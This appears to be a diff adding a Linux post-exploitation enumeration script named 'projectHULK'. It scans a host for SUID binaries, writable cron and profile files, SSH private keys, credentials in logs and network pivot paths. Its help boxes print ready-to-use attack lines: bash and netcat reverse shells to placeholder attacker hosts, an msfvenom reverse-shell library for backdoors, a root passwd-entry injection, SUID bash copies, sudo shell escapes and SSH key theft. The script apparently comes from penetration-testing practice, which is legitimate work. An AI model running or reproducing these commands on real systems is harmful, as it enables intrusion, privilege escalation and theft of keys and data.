+echo -e "\n\n${RED}\t\tEnumeration on progress ╔══════════════════......................(20%)..........................................\033[0m\n"
+sleep 5
+echo -e "\t${RED} ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m"
+echo -e "\t${RED}  ══════════════════════════════════════════════════════════════[ System Date/Time ]══════════════════════════════════════════════════════════════ \033[0m"
+echo -e "\t${RED} ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m"
+echo -e "\n"
+sleep 1
+echo -e "\n${BLUE}[+] System Up Time:\033[0m"
+    uptime | sed -E 's/^[^,]*up *//; s/, *[[:digit:]]* users.*//; s/min/minutes/; s/([[:digit:]]+):0?([[:digit:]]+)/\1 hours, \2 minutes/'
+echo -e "\n${BLUE}[+] System Date:\033[0m"
+    date 2>/dev/null 
+echo -e "\n${BLUE}[+] CPU Information:\033[0m"
+    lscpu 2>/dev/null 
+echo -e "\n${BLUE}[+] System Timer List:\033[0m"
+    systemctl list-timers --all 2>/dev/null 
+echo -e "\n"
+echo -e "\t${RED} ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m"
+echo -e "\t${RED}  ════════════════════════════════════════════════════════════════[ System SUID ]═════════════════════════════════════════════════════════════════ \033[0m"
+echo -e "\t${RED} ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m"
+echo -e "\n"
+sleep 1
+echo -e "\n${BLUE}[+] What is SUID/GUID?\033[0m"
+        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║SUID (Set User ID) and SGIDs (Set Group ID) executables are those that execute║"
+        echo -e "\t  ║with the permission of the owner (SUID) or group (SGID). You can identify SUID║"
+        echo -e "\t  ║and SGIDs by a representative 's' in the execute permission field the file:   ║"
+        echo -e "\t  ║-rwsr-sr-x can often be exploit d to gain root privilege.                     ║"
+        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Find capability files:\033[0m"
+    getcap -r / 2>/dev/null
+        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║Capability files are different from system to another system. Googling them my║"
+        echo -e "\t  ║revile a way of how to exploit them.                                          ║"
+        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Capability with setui+ep:\033[0m"
+    getcap -r / 2>/dev/null | grep cap_setuid+ep
+echo -e "\n${BLUE}[+] Built-in Binaries:\033[0m"
+		echo -e "\t  /usr/sbin/pppd                    |  /usr/sbin/exim4"
+		echo -e "\t  /usr/bin/ntfs-3g                  |  /usr/bin/chsh"
+		echo -e "\t  /usr/bin/su                       |  /usr/bin/chfn"
+		echo -e "\t  /usr/bin/mount                    |  /usr/bin/sudo"
+		echo -e "\t  /usr/bin/umount                   |  /usr/bin/pkexec"
+		echo -e "\t  /usr/bin/passwd                   |  /usr/bin/newgrp"
+		echo -e "\t  /usr/bin/gpasswd                  |  /usr/bin/fusermount"
+		echo -e "\t  /usr/sbin/mount.nfs               |  /usr/sbin/mount.cifs"
+		echo -e "\t  /usr/lib/xorg/Xorg.wrap           |  /usr/lib/openssh/ssh-keysign"
+		echo -e "\t  /usr/lib/chromium/chrome-sandbox  |  /usr/libexec/polkit-agent-helper-1"
+		echo -e "\t  /usr/bin/vmware-user-suid-wrapper |  /usr/lib/dbus-1.0/dbus-daemon-launch-helper"
+        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║Most linux system have these Binaries, and they are built-in, no escalation   ║"
+        echo -e "\t  ║is done by them unless file permission has been change.                       ║"
+        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Finding System SUID:\033[0m"
+    find / -perm -u=s 2>/dev/null | xargs ls -la --color=always
+echo -e "\n${BLUE}[+] SUID not built-in (Supper Interesting :D)\033[0m"
+    find / -perm -u=s 2>/dev/null | xargs ls -la --color=always | grep -v pppd | grep -v exim4 | grep -v ntfs-3g | grep -v chsh | grep -v su | grep -v chfn | grep -v mount | grep -v sudo | grep -v umount | grep -v pkexec | grep -v passwd | grep -v newgrp | grep -v gpasswd | grep -v fusermount | grep -v mount.nfs | grep -v mount.cifs | grep -v Xorg.wrap | grep -v ssh-keysign | grep -v chrome-sandbox | grep -v polkit-agent-helper-1 | grep -v vmware-user-suid-wrapper | grep -v dbus-daemon-launch-helper
+        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║When extra bit “4” is set to user(Owner) it becomes SUID (Set user ID):       ║"
+        echo -e "\t  ║-rw${RED}x\033[0m     -rwx     -rwx                                                        ║"
+        echo -e "\t  ║SUID                                                                          ║"
+        echo -e "\t  ║-rw${RED}s\033[0m                                                                          ║"
+        echo -e "\t  ║Visite:                                                                       ║"
+        echo -e "\t  ║https://gtfobins.github.io/                                                   ║"
+        echo -e "\t  ║https://mil0.io/linux-privesc/                                                ║"
+        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Finding System GUID (execute as the group):\033[0m"
+    find / -perm -g=s -type f 2>/dev/null | xargs ls -la --color=always
+        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║When bit “2” is set to group it becomes SGID (Set Group ID):                  ║"
+        echo -e "\t  ║-rwx     -rw${RED}x\033[0m     -rwx                                                        ║"
+        echo -e "\t  ║         SGID                                                                 ║"
+        echo -e "\t  ║         -rw${RED}s\033[0m                                                                 ║"
+        echo -e "\t  ║Visite:                                                                       ║"
+        echo -e "\t  ║https://gtfobins.github.io/                                                   ║"
+        echo -e "\t  ║https://mil0.io/linux-privesc/                                                ║"
+        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Find sticky-bit binaries:\033[0m"
+    find / -type d -perm -1000 -exec ls -ld --color=always {} \; 2>/dev/null
+echo -e "\n${BLUE}[+] World writable scripts invoked as root:\033[0m"
+echo -e "\n\033[0;37;41mRun this command manually: find / -writable -type f 2>/dev/null | xargs ls -la\033[0m"
+        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║If you find a script that is owned by root but is writable by anyone, you can ║"
+        echo -e "\t  ║add your own malicious code into it and it will escalate your privileges when ║"
+        echo -e "\t  ║the script runs as root                                                       ║"
+        echo -e "\t  ║${RED}exploit :\033[0m                                                                     ║"
+        echo -e "\t  ║  ${RED}bash: echo 'bash -i >& /dev/tcp/<attacker_IP>/<attacker_PORT> 0>&1' >> file\033[0m ║"
+        echo -e "\t  ║  ${RED}netcat: echo 'nc <attacker_IP> <attacker_PORT> -e /bin/sh' >> file\033[0m          ║"
+        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] World writable directories:\033[0m"
+    find / -type d \( -perm -g+w -o -perm -o+w \) -exec ls -lad --color=always {} \; 2>/dev/null
+echo -e "\n${BLUE}[+] writable config files:\033[0m"
+    find /etc/ -writable -type f 2>/dev/null | xargs ls -la --color=always 2>/dev/null
+echo -e "\n${BLUE}[+] How Files Can Be Upload/Download:\033[0m"
+    which wget nc netcat socat python python2 python3 ftp tftp ssh smb | xargs ls -la --color=always
+        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║Some of them my have file misconfiguration and my lead to user escalation.    ║"
+        echo -e "\t  ║File Transfer Cheatsheet: Windows and Linux                                   ║"
+        echo -e "\t  ║https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/    ║"
+        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Unexpected commands allows you to read and/or write files or even execute command:\033[0m"
+        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
+        echo -e '\t  ║sudo awk "BEGIN {system("/bin/sh")}"                                          ║'
+        echo -e "\t  ║sudo find /etc -exec sh -i \;                                                 ║"
+        echo -e "\t  ║sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh                          ║"
+        echo -e "\t  ║sudo tar c a.tar -I ./runme.sh a                                              ║"
+        echo -e "\t  ║ftp>!/bin/sh                                                                  ║"
+        echo -e "\t  ║less>! <shell_comand>                                                         ║"
+        echo -e "\t  ║                                Give it a try                                 ║"
+        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Profiles files:\033[0m"
+    ls -l /etc/profile /etc/profile.d/ --color=always
+        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║The file /etc/profile and the files under /etc/profile.d/ are scripts that are║"
+        echo -e "\t  ║executed when a user run a new shell. Therefore, if you can write or modify   ║"
+        echo -e "\t  ║any of the files, you can escalate your privilege.                            ║"
+        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Is the .bashrc file writable?\033[0m"
+    ls -la /home/*/.bashrc; locate .bashrc | xargs ls -la --color=always; find / -name .bashrc -xdev 2>/dev/null | xargs ls -la --color=always
+        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║If so, malicious commands can be written to it and will be executed when the  ║"
+        echo -e "\t  ║user/root logs in.                                                            ║"
+        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n\n${RED}\t\tEnumeration on progress ╔════════════════════════════════════════(50%)..........................................\033[0m\n"
+sleep 5
+echo -e "\t${RED} ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m"
+echo -e "\t${RED}  ═════════════════════════════════════════════════════════[ System Process and Services ]════════════════════════════════════════════════════════ \033[0m"
+echo -e "\t${RED} ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m"
+echo -e "\n"
+sleep 1
+        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║Have a look to what processes are being executed and check if any process has ║"
+        echo -e "\t  ║more privileges than it should. You can also use a tool called psyp.          ║"
+        echo -e "\t  ║https://github.com/DominicBreuker/pspy                                        ║"
+        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Running Proccess on the system:\033[0m"
+    ps aux 
+echo -e "\n${BLUE}[+] Running Proccess as root:\033[0m"
+    ps aux | grep --color=always root
+echo -e "\n${BLUE}[+] Running Proccess as current user:\033[0m"
+    ps aux | grep --color=always $USER
+echo -e "\n${BLUE}[+] Process binaries and associated permissions:\033[0m"
+    ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null
+echo -e "\n${BLUE}[+] Are service config files readable/wreitable by current user:\033[0m"
+    find /etc/init.d/ -uid 0 -type f 2>/dev/null | xargs ls -la --color=always 2>/dev/null
+echo -e "\n${BLUE}[+] Shared object libraries (GOOD FOR BACKDOOR):\033[0m"
+    ldd /usr/local/bin/program 2>/dev/null
+echo -e "\n${BLUE}[+] Is the executable compiled with RPATH or RUNPATH (GOOD FOR BACKDOOR):\033[0m"
+    objdump -x /usr/local/bin/program 2>/dev/null | grep -i "RPATH\|RUNPATH"
+        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║If any executable is found, create the backdoor using any payload you wich    ║"
+        echo -e "\t  ║using the same file found.                                                    ║"
+        echo -e "\t  ║For Example:                                                                  ║"
+        echo -e "\t  ║Payload using msfvenome:                                                      ║"
+        echo -e "\t  ║   msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=<attacker IP>         ║"
+        echo -e "\t  ║   LPORT=<attacker LPORT> -f elf-so -o FILENAME.so                            ║"
+        echo -e "\t  ║Then send the file to the same directory, configure a Metasploit listener with║"
+        echo -e "\t  ║the same payloadlunch and wait for the program to be launched by a user with  ║"
+        echo -e "\t  ║elevated privileges.                                                          ║"
+        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n"
+echo -e "\t${RED} ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m"
+echo -e "\t${RED}  ═════════════════════════════════════════════════════════[ System Path Scheduled Tasks ]════════════════════════════════════════════════════════ \033[0m"
+echo -e "\t${RED} ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m"
+echo -e "\n"
+sleep 1
+echo -e "\n${BLUE}[+] Current User Crontab:\033[0m"
+    crontab -l 
+echo -e "\n${BLUE}[+] Find World-Writable Cron jobs:\033[0m"
+    find /etc/cron* -type f -perm -o+w -exec ls -l {} \; 
+echo -e "\n${BLUE}[+] Other User Crontab [It may need root]:\033[0m"
+    cut -d ":" -f 1 /etc/passwd | xargs -n1 crontab -l -u 2>/dev/null 
+        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║If you have the root/user password, try to run the command manually:          ║"
+        echo -e "\t  ║cut -d ":" -f 1 /etc/passwd | xargs -n1 crontab -l -u 2>/dev/null               ║"
+        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Scheduled Jobs:\033[0m"
+    cat /etc/crontab 2>/dev/null 
+        echo -e "\n\033[0;37;41mIf the File is Writable\033[0m"
+        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║If the file is running by root, & writable to anyone, the attacker my replace the content of the file.    ║"
+        echo -e "\t  ║${RED}exploit :\033[0m                                                                                                 ║"
+        echo -e "\t  ║  ${RED}echo '/bin/sh' >> file\033[0m                                                                                  ║"
+        echo -e "\t  ║  ${RED}echo '/bin/bash' >> file \033[0m                                                                               ║"
+        echo -e "\t  ║  ${RED}echo 'bash -i >& /dev/tcp/a.a.a.a/4242 0>&1' >> file\033[0m                                                    ║"
+        echo -e "\t  ║  ${RED}echo 'm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc a.a.a.a 443 >/tmp/f' >> file\033[0m                 ║"
+        echo -e "\t  ║  ${RED}echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> file\033[0m                                               ║"
+        echo -e "\t  ║  ${RED}echo 'echo root::0:0:root:/root:/bin/bash >> /etc/passwd' >> file\033[0m                                       ║"
+        echo -e "\t  ║${RED}You can use any Reverse Shell payload from payloadallthethings in GitHub\033[0m                                  ║"
+        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n"
+echo -e "\t${RED} ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m"
+echo -e "\t${RED}  ═════════════════════════════════════════════════════════[ Communications & Networking ]════════════════════════════════════════════════════════ \033[0m"
+echo -e "\t${RED} ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m"
+echo -e "\n"
+sleep 1
+echo -e "\n${BLUE}[+] Basic Network Details:\033[0m"
+    ifconfig | grep -v "ether\|loop\|TX\|RX"
+echo -e "\n${BLUE}[+] Default Gatway:\033[0m"
+    route 2>/dev/null
+echo -e "\n${BLUE}[+] Full Network Details:\033[0m"
+    ifconfig
+echo -e "\n${BLUE}[+] Firewall Rulls:\033[0m"
+    iptables -nvL 2>/dev/null
+echo -e "\n${BLUE}[+] Open Ports:\033[0m"
+    netstat -tulpna
+        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║Are there any open ports on localhost we did not see when we were doing nmap? ║"
+        echo -e "\t  ║This might need tunneling or connecting to it locally. If nothing is displayed║"
+        echo -e "\t  ║run the command manually: netstat -tulpna                                     ║"
+        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Network Route & Neighbours:\033[0m"
+    route; ip n
+        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║Want to know how many hops are between our compromised machine, and other     ║"
+        echo -e "\t  ║network segments, do the following manually:                                  ║"
+        echo -e "\t  ║traceroute –n <ip address>                                                    ║"
+        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] ARP Cashe:\033[0m"
+    arp; arp -en | grep -v Address
+echo -e "\n${BLUE}[+] Pivoting:\033[0m"
+        echo -e "\t  ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║Try to scan the Host network and see if there is any other host are online, use any of:                             ║"
+        echo -e '\t  ║  for ip in $(seq 1 255); do ping -c 1 v.v.v.$ip | grep "bytes from"; done                                          ║'
+        echo -e "\t  ║  for i in {1..255}; do ping -c 1 v.v.v.$i | grep 'bytes from' ; done                                                 ║"
+        echo -e '\t  ║  for i in {1..255} ;do (ping v.v.v.$i -c 1 -w 5  >/dev/null && echo "v.v.v.$i Host Is Alive") ; done               ║'
+        echo -e "\t  ║We won't be able to access those machine, therefor, will have to do tunneling from the current machine to them.     ║"
+        echo -e "\t  ║Read More:                                                                                                          ║"
+        echo -e "\t  ║https://nullsweep.com/pivot-cheatsheet-for-pentesters/                                                              ║"
+        echo -e "\t  ║https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html                                                  ║"
+        echo -e "\t  ║https://ivanitlearning.wordpress.com/2019/03/08/client-side-exploitation-windows-pivoting-w-o-metasploit/           ║"
+        echo -e "\t  ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Hosts File:\033[0m"
+    cat /etc/hosts 
+echo -e "\n${BLUE}[+] DNS Server:\033[0m"
+    cat /etc/resolv.conf | grep nameserver
+echo -e "\n${BLUE}[+] Outbound port connectivity:\033[0m"
+    nmap -sT -p4444-4450 portquiz.net 2>/dev/null
+        echo -e "\t  ╔═══════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║Knowing this information will come in handy if and when we need to establish   ║"
+        echo -e "\t  ║outbound connections to other systems we control for the purpose of maintaining║"
+        echo -e "\t  ║access or exfiltrating data.                                                   ║"
+        echo -e "\t  ╚═══════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n\n${RED}\t\tEnumeration on progress ╔════════════════════════════════════════(80%)═════════════════.........................\033[0m\n"
+sleep 5
+echo -e "\t${RED} ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m"
+echo -e "\t${RED}  ═══════════════════════════════════════════════════════════════[ Finding SSH Keys ]═════════════════════════════════════════════════════════════ \033[0m"
+echo -e "\t${RED} ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m"
+echo -e "\n"
+sleep 1
+echo -e "\n${BLUE}[+] SSH is configured for Public Key Authentication:\033[0m"
+    cat /etc/ssh/sshd_config | grep 'PubkeyAuthentication' --color=always
+echo -e "\n${BLUE}[+] Identify any existing public or private keys:\033[0m"
+    ls -la /$USER /etc/ssh /home/$USER/.ssh/ --color=always 2>/dev/null; cat /home/$USER/.ssh/id_rsa 2>/dev/null; cat /home/$USER/.ssh/id_dsa 2>/dev/null
+echo -e "\n\033[0;37;41mExploiting Misconfigured SSH Keys\033[0m"
+        echo -e "\t  ╔═══════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║Secure Shell (SSH) is a cryptographic network protocol which allows users to securely      ║"
+        echo -e "\t  ║perform a number of network services, such as remote authentication or file transfer over  ║"
+        echo -e "\t  ║an unsecured network. exploit :                                                            ║"
+        echo -e "\t  ║https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/ ║"
+        echo -e "\t  ╚═══════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] id_rsa:\033[0m"
+    find / -name id_rsa 2>/dev/null 
+        echo -e "\t  ╔═══════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║If anyone have access to any user's id_rsa, he can login to the system using that key.     ║"
+        echo -e "\t  ║${RED}exploit :\033[0m                                                                                  ║"
+        echo -e "\t  ║  ${RED}scp -P 22 username@v.v.v.v:/path/to/id_rsa /path/to/attacker\033[0m                             ║"
+        echo -e "\t  ║  ${RED}chmod 0600 id_rsa\033[0m                                                                        ║"
+        echo -e "\t  ║  ${RED}ssh -p 22 user-of-id_rsa@v.v.v.v -i id_rsa\033[0m                                               ║"
+        echo -e "\t  ║Read More:                                                                                 ║"
+        echo -e "\t  ║  https://matt.might.net/articles/ssh-hacks/                                               ║"
+        echo -e "\t  ║  https://book.hacktricks.xyz/pentesting/pentesting-ssh                                    ║"
+        echo -e "\t  ╚═══════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] id_dsa:\033[0m"
+    find / -name id_dsa 2>/dev/null
+echo -e "\n${BLUE}[+] authorized_keys:\033[0m"
+    find / -name authorized_keys 2>/dev/null
+echo -e "\n${BLUE}[+] ssh_config File:\033[0m"
+    ls -la /etc/ssh/ssh_config --color=always
+echo -e "\n${BLUE}[+] Reading ssh_config File:\033[0m"
+    cat /etc/ssh/ssh_config
+echo -e "\n${BLUE}[+] sshd_config File:\033[0m"
+    ls -la /usr/share/openssh/sshd_config --color=always 2>/dev/null
+echo -e "\n${BLUE}[+] Reading sshd_config File:\033[0m"
+    cat /usr/share/openssh/sshd_config 2>/dev/null
+        echo -e "\t  ╔═══════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║Read more about sshd_config file:                                                              ║"
+        echo -e "\t  ║  https://www.ssh.com/academy/ssh/sshd_config                                                  ║"
+        echo -e "\t  ╚═══════════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] hosts.denied:\033[0m"
+    ls -la /etc/hosts.denied --color=always 2>/dev/null 
+echo -e "\n${BLUE}[+] Reading hosts.denied:\033[0m"
+    cat /etc/hosts.denied 2>/dev/null 
+echo -e "\n${BLUE}[+] hosts.allow:\033[0m"
+    ls -la /etc/hosts.allow --color=always 2>/dev/null 
+echo -e "\n${BLUE}[+] Reading hosts.allow:\033[0m"
+    cat /etc/hosts.allow 2>/dev/null 
+        echo -e "\t  ╔═══════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║When a client attempts to connect to a network service on a remote system, these files are     ║"
+        echo -e "\t  ║used to determine whether client access is allowed or denied. Use /etc/hosts.allow and         ║"
+        echo -e "\t  ║/etc/hosts.deny to define rules that selectively allow or deny clients access to server        ║"
+        echo -e "\t  ║daemons on local system.                                                                       ║"
+        echo -e "\t  ║Read More:                                                                                     ║"
+        echo -e "\t  ║https://www.thegeekdiary.com/understanding-tcp-wrappers-in-linux/                              ║"
+        echo -e "\t  ║http://www.freekb.net/Article?id=1091                                                          ║"
+        echo -e "\t  ║https://www.smartdomotik.com/2015/02/09/using-etchosts-allow-and-etchosts-deny-to-secure-unix/ ║"
+        echo -e "\t  ╚═══════════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Any active SSH session:\033[0m"
+    ps aux | grep sshd
+        echo -e "\t  ╔═══════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║If any session is found, the session can be hijacked. Read more about SSH session hijacking:   ║"
+        echo -e "\t  ║  https://xorl.wordpress.com/2018/02/04/ssh-hijacking-for-lateral-movement/                    ║"
+        echo -e "\t  ╚═══════════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n"
+echo -e "\t${RED} ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m"
+echo -e "\t${RED}  ═════════════════════════════════════════════════════════════════[ Extra Creds ]════════════════════════════════════════════════════════════════ \033[0m"
+echo -e "\t${RED} ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m"
+echo -e "\n"
+sleep 1
+echo -e "\n${BLUE}[+] Mail File:\033[0m"
+    ls -la /var/mail/ --color=always 2>/dev/null
+echo -e "\n${BLUE}[+] List Root Directory:\033[0m"
+    ls -la /root/ 2>/dev/null --color=always
+echo -e "\n${BLUE}[+] Home Directory:\033[0m"
+    ls -la /home/ --color=always 2>/dev/null
+echo -e "\n${BLUE}[+] Tmp Directory:\033[0m"
+    ls -la /tmp  --color=always 2>/dev/null
+echo -e "\n${BLUE}[+] Backup Directory:\033[0m"
+    ls -la /var/backups 2>/dev/null && find / -type f  -name *backup* -o -name *.bak -o -name *.bak* -o -name *.bck -o -name *.bk -o -name *.old*  2>/dev/null  | xargs ls -la 2>/dev/null --color=always | grep backup
+echo -e "\n${BLUE}[+] Apache2 Version:\033[0m"
+    apache2 -v 2>/dev/null; httpd -v 2>/dev/null
+echo -e "\n${BLUE}[+] Apache user:\033[0m"
+    grep --color=always -i 'user\|group' /etc/apache2/envvars 2>/dev/null --color=always
+echo -e "\n${BLUE}[+] Apache Config File:\033[0m"
+    cat /var/apache2/config.inc 2>/dev/null 
+echo -e "\n${BLUE}[+] Check readability of apache/nginx access log:\033[0m"
+    cat /var/log/apache/access.log 2>/dev/null | grep -i "user\|pass" 2>/dev/null
+    cat /var/log/apache2/access.log 2>/dev/null
+    nginx= cat /var/log/nginx/access.log 2>/dev/null 
+echo -e "\n${BLUE}[+] MySQL Version:\033[0m"
+    mysql --version 2>/dev/null --color=always
+echo -e "\n${BLUE}[+] MySQL:\033[0m"
+    ls -la /var/lib/mysql 2>/dev/null --color=always
+echo -e "\n${BLUE}[+] Log File:\033[0m"
+    ls -la /var/log 2>/dev/null --color=always
+        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║Do the following and see if there is any password:-                               ║"
+        echo -e "\t  ║  grep -r passw . 2>/dev/null                                                     ║"
+        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] .config file in /var/www:\033[0m"
+    ls -la /var/www --color=always 2>/dev/null
+echo -e "\n${BLUE}[+] Spool File:\033[0m"
+    ls -la /var/spool 2>/dev/null --color=always
+        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║Contains data which is awaiting some kind of later processing. Data in /var/spool ║"
+        echo -e "\t  ║represents work to be done in the future (by a program, user, or administrator);  ║"
+        echo -e "\t  ║often data is deleted after it has been processed.                                ║"
+        echo -e "\t  ║Read More:                                                                        ║"
+        echo -e "\t  ║https://refspecs.linuxfoundation.org/FHS_3.0/fhs/ch05s14.html                     ║"
+        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] PostgreSQL Version:\033[0m"
+    psql -V 2>/dev/null
+echo -e "\n${BLUE}[+] PostgreSQL:\033[0m"
+    ls -la /var/lib/pgsql 2>/dev/null
+echo -e "\n${BLUE}[+] System files dont belong to root:\033[0m"
+    find /lib/systemd/ \! -uid 0 -type f 2>/dev/null | xargs -r ls -la 2>/dev/null --color=always
+echo -e "\n${BLUE}[+] Tools/Languages Installed:\033[0m"
+    which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null 
+        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║Some of the tools have an exploit, do compgen -c to list all of the tools.    ║"
+        echo -e "\t  ║Exploit: https://gtfobins.github.io/                                          ║"
+        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Read roots mail:\033[0m"
+    head /var/mail/root 2>/dev/null
+echo -e "\n${BLUE}[+] Config Files:\033[0m"
+    find / -name *.config -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always
+echo -e "\n${BLUE}[+] Bash Files:\033[0m"
+    find / -name *.sh -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/\|/opt/firmware-mod-kit/"
+        echo -e "\t  ╔═══════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║projectHULK search has excluded the following directory:-                      ║"
+        echo -e "\t  ║  /usr/*       |  /opt/firmware-mod-kit/*                                      ║"
+        echo -e "\t  ╚═══════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Python Files:\033[0m"
+    find / -name *.py -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/\|/opt/firmware-mod-kit/\|/opt/xplico/"
+        echo -e "\t  ╔═══════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║projectHULK search has excluded the following directory:-                      ║"
+        echo -e "\t  ║  /usr/*       |  /opt/firmware-mod-kit/*       |  /opt/xplico/*               ║"
+        echo -e "\t  ╚═══════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] PHP Files:\033[0m"
+    find / -name *.php -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/share\|/opt/xplico"
+        echo -e "\t  ╔═══════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║projectHULK search has excluded the following directory:-                      ║"
+        echo -e "\t  ║  /usr/*       |  /opt/xplico/*                                                ║"
+        echo -e "\t  ╚═══════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Text Files:\033[0m"
+    find / -name *.txt 2>/dev/null | grep -v "/usr/\|/opt/\|/etc/\|/root/.*" | xargs ls -la --color=always 2>/dev/null
